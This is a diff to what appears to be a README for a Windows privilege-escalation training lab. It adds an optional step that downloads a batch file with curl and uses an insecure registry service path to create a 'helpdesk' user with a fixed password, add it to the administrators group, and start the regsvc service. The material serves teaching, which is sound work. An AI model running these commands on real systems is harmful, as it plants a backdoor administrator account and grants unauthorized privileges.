@@ -25,6 +25,7 @@ Megacorp, a very large company, has recently acquired several SMEs (Small and Me
     - [RemoteMouseService (CVE-2021-35448)](#remotemouseservice-cve-2021-35448)
     - [Unquoted Service Path](#unquoted-service-path)
     - [Insecure Registry Service](#insecure-registry-service)
+      - [(Optional) Running ModifyServiceImagePath util](#optional-running-modifyserviceimagepath-util)
     - [File Permission Service](#file-permission-service)
     - [DLL Hijack Service](#dll-hijack-service)
     - [DACL Service](#dacl-service)
@@ -526,6 +527,34 @@ wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows
 We can change the service's executable path in the registry.
 
 > **Tip:** Try running the `ModifyServiceImagePath.bat` util!
+
+#### (Optional) Running ModifyServiceImagePath util
+
+1. **Download the Batch File:**
+
+   Use this command to download a batch file to your computer:
+
+   ```bash
+   curl -L -o "%USERPROFILE%\ModifyServiceImagePath.bat" https://raw.githubusercontent.com/Ardemium/InsideJob/refs/heads/main/utils/ModifyServiceImagePath.bat
+   ```
+
+2. **Run the Batch File:**
+
+   Run the downloaded batch file to create a new user (`helpdesk`), set the password to `L3tm3!n`, and give the user admin rights:
+
+   ```bash
+   %USERPROFILE%\ModifyServiceImagePath.bat "cmd.exe /c net user helpdesk L3tm3!n /add ^&^& net localgroup administrators helpdesk /add"
+   ```
+
+3. **Start a Service:**
+
+   Finally, start the `regsvc` service (Remote Registry service) with this command:
+
+   ```bash
+   sc start regsvc
+   ```
+
+---
 
 **GUI Steps:**
 
